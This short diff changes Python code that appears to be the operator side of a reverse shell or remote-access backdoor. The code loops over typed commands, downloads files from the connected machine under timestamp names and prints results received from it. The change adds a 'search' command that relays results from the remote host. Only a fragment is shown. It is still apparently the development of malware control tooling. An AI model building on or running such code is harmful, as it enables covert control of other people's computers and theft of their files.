@@ -152,6 +152,7 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
             self.connection.send("[-] File not found".encode())
             print("[-] File not found")
 
+
     def run(self):
         while(True):
             try:
@@ -173,6 +174,9 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                     filename = str(datetime.datetime.now())
                     self.download(filename)
                     os.chdir("..")
+                elif cmd[0] == "search" and len(cmd)>1:
+                    res = self.r_recv()
+                    print(res)
                 else:
                     result = self.r_recv()
                     print(result)
